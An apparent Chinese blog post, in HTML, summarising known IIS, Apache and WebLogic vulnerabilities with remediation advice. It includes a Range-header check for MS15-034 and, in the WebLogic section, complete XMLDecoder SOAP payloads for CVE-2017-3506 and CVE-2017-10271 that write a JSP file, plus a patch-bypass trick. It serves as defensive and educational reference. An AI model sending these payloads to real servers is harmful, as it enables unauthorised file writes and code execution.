@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+  <link rel="manifest" href="/images/manifest.json">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="常见的IIS、Apache、Nginx、Tomcat、JBoss、Weblogic等的漏洞总结">
+<meta property="og:type" content="article">
+<meta property="og:title" content="web中间件漏洞总结">
+<meta property="og:url" content="http://example.com/2022/03/28/web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:site_name" content="Spring&#39;blog">
+<meta property="og:description" content="常见的IIS、Apache、Nginx、Tomcat、JBoss、Weblogic等的漏洞总结">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328190222573.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328201323568.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328202458726.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328203645115.png">
+<meta property="article:published_time" content="2022-03-28T10:40:35.000Z">
+<meta property="article:modified_time" content="2022-04-05T08:14:12.411Z">
+<meta property="article:author" content="Spring">
+<meta property="article:tag" content="中间件">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328190222573.png">
+
+<link rel="canonical" href="http://example.com/2022/03/28/web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>web中间件漏洞总结 | Spring'blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">Spring'blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">我还年轻，吃苦趁现在。</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">14</span></a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">7</span></a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">14</span></a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/03/28/web%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Spring">
+      <meta itemprop="description" content="见到一座山，就想知道山后面是什么。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Spring'blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          web中间件漏洞总结
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-03-28 18:40:35" itemprop="dateCreated datePublished" datetime="2022-03-28T18:40:35+08:00">2022-03-28</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-04-05 16:14:12" itemprop="dateModified" datetime="2022-04-05T16:14:12+08:00">2022-04-05</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <div class="post-description">常见的IIS、Apache、Nginx、Tomcat、JBoss、Weblogic等的漏洞总结</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <span id="more"></span>
+
+<h1 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h1><p>IS是Internet lnformation Services的缩写，意为互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。lIS目前只适用于Windows系统，不适用于其他操作系统。</p>
+<h2 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="IIS-6-x"><a href="#IIS-6-x" class="headerlink" title="IIS 6.x"></a>IIS 6.x</h3><h4 id="基于文件名字"><a href="#基于文件名字" class="headerlink" title="基于文件名字"></a>基于文件名字</h4><p>该版本默认将*.asp;.jpg此种格式的文件名，当成asp来解析，原理是服务器默认不解析;及其后面的内容，相当于截断。</p>
+<p>另外，IIS6.x除了会将扩展名为.asp的文件解析为asp之外，还默认会将扩展名为.asa，.cdx，.cer解析为asp,</p>
+<h4 id="基于文件夹"><a href="#基于文件夹" class="headerlink" title="基于文件夹"></a>基于文件夹</h4><p>该版本默认会将*.asp&#x2F;目录下的所有文件当成Asp解析。</p>
+<h4 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h4><p>1.限制上传目录执行权限，不允许执行脚本。</p>
+<p>2.不允许新建目录。</p>
+<p>3.上传的文件重新命名（时间戳+随机数+.jpg等）</p>
+<h3 id="IIS-7-x"><a href="#IIS-7-x" class="headerlink" title="IIS 7.x"></a>IIS 7.x</h3><p>在Fast-CGI运行模式下,在任意文件，例: test.jpg后面加上&#x2F;.php，会将test.jpg 解析为php文件。</p>
+<h4 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h4><p>配置cgi.fix_pathinfo(php.ini中)为O并重启php-cgi程序</p>
+<h2 id="PUT任意文件写入"><a href="#PUT任意文件写入" class="headerlink" title="PUT任意文件写入"></a>PUT任意文件写入</h2><p>IIS Server 在Web服务扩展中开启了WebDAV之后，支持多种请求，配合写入权限，可造成任意文件写入。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328190222573.png" alt="image-20220328190222573"></p>
+<h3 id="修复建议-2"><a href="#修复建议-2" class="headerlink" title="修复建议"></a>修复建议</h3><p>关闭WebDAV和写权限</p>
+<h2 id="IIS短文件漏洞"><a href="#IIS短文件漏洞" class="headerlink" title="IIS短文件漏洞"></a>IIS短文件漏洞</h2><p>1.当后缀小于4时，短文件名产生需要文件(夹)名前缀字符长度大于等于9位。</p>
+<p>2.当后缀大于等于4时，文件名前缀字符长度即使为1，也会产生短文件名。</p>
+<p>目前IIS支持短文件名猜测的HTTP方法主要包括:DEBUG、OPTIONS、GET、POST、HEAD、TRACE六种。</p>
+<p>IIS 8.0之后的版本只能通过OPTIONS和TRACE方法被猜测成功。</p>
+<p>lIS8.0以下版本需要开启ASP.NET支持，lIS大于等于8.0版本,即使没有安装ASP.NET，通过OPTIONS和TRACE方法也可以猜解成功。</p>
+<h2 id="HTTP-SYS远程代码执行-MS15-034"><a href="#HTTP-SYS远程代码执行-MS15-034" class="headerlink" title="HTTP.SYS远程代码执行(MS15-034)"></a>HTTP.SYS远程代码执行(MS15-034)</h2><p>影响范围:<br>Windows 7、Windows Server 2008 R2、Windows 8、Windows Server 2012、Windows 8.1和Windows Server 2012R2</p>
+<p>复现：</p>
+<p>1.打开IIS页面</p>
+<p>2.编辑请求头，增加Range: bytes&#x3D;0-18446744073709551615字段，若返回码状态为416 Requested Range Not Satisfiable，则存在。</p>
+<h3 id="修复建议-3"><a href="#修复建议-3" class="headerlink" title="修复建议"></a>修复建议</h3><p>安装修复补丁(KB3042553)</p>
+<h2 id="RCE-CVE-2017-7269"><a href="#RCE-CVE-2017-7269" class="headerlink" title="RCE-CVE-2017-7269"></a>RCE-CVE-2017-7269</h2><p>MicrosoftWMndows Server 2003 R2中的nternet信息服务(IIS)6.0中的WebDAV服务中的ScStoragePathFromUrl函数中的缓冲区溢出允许远程攻击者通过以”lf:&lt;http:  &#x2F;&#x2F;“开头的长标头执行任意代码PROPFIND请求。</p>
+<p>影响范围:<br>在Windows 2003 R2 (Microsoft(R)Windows(R) Server 2003,Enterprise Edition Service Pack2〉上使用IIS 6.0并开启WebDAV扩展。</p>
+<h3 id="修复建议-4"><a href="#修复建议-4" class="headerlink" title="修复建议"></a>修复建议</h3><p>关闭WebDAV</p>
+<h1 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h1><p>Apache是世界使用排名第一的Web服务器软件。它可以运行在几乎所有广泛使用的计算机平台上，由于其跨平台和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将Perl&#x2F;Python等解释器编译到服务器中。</p>
+<h2 id="解析漏洞-1"><a href="#解析漏洞-1" class="headerlink" title="解析漏洞"></a>解析漏洞</h2><h3 id="未知扩展名解析漏洞"><a href="#未知扩展名解析漏洞" class="headerlink" title="未知扩展名解析漏洞"></a>未知扩展名解析漏洞</h3><p>Apache的解析漏洞依赖于一个特性: Apache默认一个文件可以有多个以点分割的后缀，当最右边的后缀无法识别(不在mime.types文件内)，则继续向左识别，直到识别到合法后缀才进行解析。</p>
+<p>实战中可以上传rar， owf等文件进行利用，如果上传phpinfo.php.ipg，即使文件名中有.php，也会直接解析为ipg。因为Apache认识.pg,停止继续向左识别。</p>
+<h3 id="AddHandler导致的解析漏洞"><a href="#AddHandler导致的解析漏洞" class="headerlink" title="AddHandler导致的解析漏洞"></a>AddHandler导致的解析漏洞</h3><p>如果运维人员给.php后缀增加了处理器: AddHandler application&#x2F;x-httpd-php .php<br>那么，在有多个后缀的情况下，只要一个文件名中含有.php后缀，即被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。</p>
+<p>即使最右边的文件格式是在mime.types文件内，只要文件名中出现.php，就直接被解析为php.</p>
+<h3 id="Apache-HTTPD换行解析漏洞（CVE-2017-15715"><a href="#Apache-HTTPD换行解析漏洞（CVE-2017-15715" class="headerlink" title="Apache HTTPD换行解析漏洞（CVE-2017-15715)"></a>Apache HTTPD换行解析漏洞（CVE-2017-15715)</h3><p>影响范围:2.4.0~2.4.29版本<br>环境: phpstudy2014 Apache +PHP5.4n<br>此漏洞形成的根本原因，在于$,正则表达式中$不仅匹配字符串结尾位置，也可以匹配\n或\r<br>在解析PHP时，1.php\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。</p>
+<h4 id="修复建议-5"><a href="#修复建议-5" class="headerlink" title="修复建议"></a>修复建议</h4><p>1.升级到最新版本.<br>2.或将上传的文件重命名为为时间戳+随机数+.jpg的格式并禁用上传文件目录执行脚本权限。</p>
+<h2 id="目录遍历"><a href="#目录遍历" class="headerlink" title="目录遍历"></a>目录遍历</h2><p>由于配置错误导致的目录遍历</p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>修改apache配置文件httpd.conf</p>
+<p>找到Options+Indexes+FollowSymLinks +ExecCGI并修改成 Options-Indexes+FollowSymLinks +ExecCGI 并保存；</p>
+<h1 id="WebLogic"><a href="#WebLogic" class="headerlink" title="WebLogic"></a>WebLogic</h1><p>WebLogic是美国Oracle公司出品的一个applicationserver，确切的说是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。将Java的动态功能和LJava Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。</p>
+<p>默认端口：7001</p>
+<h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。</p>
+<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>1）升级Oracle 10月份补丁。</p>
+<p>2）对访问wls-wsat的资源进行访问控制。</p>
+<h2 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h2><p>Weblogic 中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p>
+<h2 id="任意文件上传"><a href="#任意文件上传" class="headerlink" title="任意文件上传"></a>任意文件上传</h2><h3 id="漏洞简介-1"><a href="#漏洞简介-1" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>通过访问config.do配置页面，先更改Work Home工作目录，用有效的已部署的Web应用目录替换默认的存储JKS Keystores文件的目录，之后使用”添加Keystore设置”的功能，可上传恶意的JSP脚本文件</p>
+<h3 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>打补丁</p>
+<h2 id="war后门文件部署"><a href="#war后门文件部署" class="headerlink" title="war后门文件部署"></a>war后门文件部署</h2><h3 id="成因"><a href="#成因" class="headerlink" title="成因"></a>成因</h3><p>由于WebLogic后台存在弱口令，可直接登陆后台上传包含后门的war包。</p>
+<h3 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h3><p>防火墙设置端口过滤，也可以设置只允许访问后台的IP列表，避免后台弱口令。</p>
+<h2 id="XMLDecoder反序列化漏洞（CVE-2017-10271-amp-CVE-2017-3506"><a href="#XMLDecoder反序列化漏洞（CVE-2017-10271-amp-CVE-2017-3506" class="headerlink" title="XMLDecoder反序列化漏洞（CVE-2017-10271 &amp; CVE-2017-3506)"></a>XMLDecoder反序列化漏洞（CVE-2017-10271 &amp; CVE-2017-3506)</h2><p>Weblogici的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。<br>访问&#x2F;wls-wsat&#x2F;CoordinatorPortType</p>
+<p>返回如下页面，则可能存在此漏洞。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328201323568.png" alt="image-20220328201323568"></p>
+<p>只要是在wls-wsat包中的url皆受到影响，可以查看web.xml得知所有受到影响的url</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Oracle\Middleware\user_projects\domains\base_domain\servers\AdminServer\tmp\_WL_internal\wls-wsat\54p17w\war\WEB-INF\web.xml</span><br></pre></td></tr></table></figure>
+
+<p>默认受影响的url</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/wls-wsat/CoordinatorPortType </span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC </span><br><span class="line">/wls-wsat/ParticipantPortType</span><br><span class="line">/wls-wsat/RegistrationRequesterPortType</span><br><span class="line">/wls-wsat/CoordinatorPortType11 </span><br><span class="line">/wls-wsat/RegistrationPortTypeRPC11 </span><br><span class="line">/wls-wsat/ParticipantPortType11 </span><br><span class="line">/wls-wsat/RegistrationRequesterPortType11</span><br></pre></td></tr></table></figure>
+
+<p>构造写入文件数据包进行发送，如下，其中content-Type需要等于text&#x2F;xml，否则可能导致XMLDecoder不能解析。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/RegistrationPortTypeRPC HTTP/1.1 </span><br><span class="line">Host: 127.0.0.1:7001 </span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 5.2; rv:48.0) Gecko/20100101 Firefox/48.0 </span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 </span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate </span><br><span class="line">Content-Type: text/xml </span><br><span class="line">Connection: close </span><br><span class="line">Content-Length: 629</span><br><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span> 					<span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span> </span><br><span class="line">	<span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span> </span><br><span class="line">		<span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">			<span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span>&gt;</span> 						<span class="tag">&lt;<span class="name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test33.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span> 			 <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;println&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">string</span>&gt;</span></span><br><span class="line">            &lt;![CDATA[ &lt;% out.print(&quot;test777776666666&quot;); %&gt; ]]&gt;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;close&quot;</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">object</span>&gt;</span> </span><br><span class="line">         <span class="tag">&lt;/<span class="name">java</span>&gt;</span> </span><br><span class="line">      <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span> </span><br><span class="line">     <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span> </span><br><span class="line">     <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span> </span><br><span class="line"> <span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>访问&#x2F;bea_wls_internal&#x2F;test2.jsp,如下:</p>
+<p><img src="https://cdn.jsdelivr.net/gh/shiborui1913041042/shiborui1913041042.github.io/img/image-20220328202458726.png" alt="image-20220328202458726"></p>
+<p>CVE-2017-3506的补丁加了验证函数，补丁在weblogic&#x2F;wsee&#x2F;workarea&#x2F;WorkContextXmlInputAdapter.java中添加了validate方法, 验证Payload中的节点是否 存在object Tag。 </p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">validate</span><span class="params">(InputStream is)</span>&#123;</span><br><span class="line">    <span class="type">WebLogicSAXParserFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WebLogicSAXParserFactory</span>();</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">SAXParser</span> <span class="variable">parser</span> <span class="operator">=</span>factory.newSAXParser(); </span><br><span class="line">        parser.parse(is, newDefaultHandler() &#123;</span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">startElement</span><span class="params">(String uri, StringlocalName, String qName, Attributes attributes)</span><span class="keyword">throws</span> SAXException &#123; </span><br><span class="line">                <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">&quot;object&quot;</span>)) &#123; </span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Invalid context type: object&quot;</span>); </span><br><span class="line">                &#125; </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">catch</span>(ParserConfigurationException var5) &#123; </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, var5); &#125; </span><br><span class="line">    <span class="keyword">catch</span> (SAXExceptionvar6) &#123; </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, var6); &#125; </span><br><span class="line">    <span class="keyword">catch</span> (IOExceptionvar7) &#123; </span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalStateException</span>(<span class="string">&quot;Parser Exception&quot;</span>, var7);</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>我们将object换成void就可绕过此补丁，产生了CVE-2017-10271。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:soapenv</span>=<span class="string">&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Header</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;<span class="name">work:WorkContext</span> <span class="attr">xmlns:work</span>=<span class="string">&quot;http://bea.com/2004/06/soap/workarea/&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.io.PrintWriter&quot;</span>&gt;</span> 		</span><br><span class="line">   <span class="tag">&lt;<span class="name">string</span>&gt;</span>servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/test33.jsp<span class="tag">&lt;/<span class="name">string</span>&gt;</span> 			<span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;println&quot;</span>&gt;</span> </span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>&lt;![CDATA[ &lt;% out.print(&quot;test777776666666&quot;); %&gt; ]]&gt; <span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span> </span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;close&quot;</span>/&gt;</span> </span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span> </span><br><span class="line">        <span class="tag">&lt;/<span class="name">java</span>&gt;</span> </span><br><span class="line">     <span class="tag">&lt;/<span class="name">work:WorkContext</span>&gt;</span> </span><br><span class="line">    <span class="tag">&lt;/<span class="name">soapenv:Header</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">soapenv:Body</span>/&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="修复建议-6"><a href="#修复建议-6" class="headerlink" title="修复建议"></a>修复建议</h3><p>1）安装补丁。 </p>
+<p>2）或删除wls-wsat组件，再次访问返回404. </p>
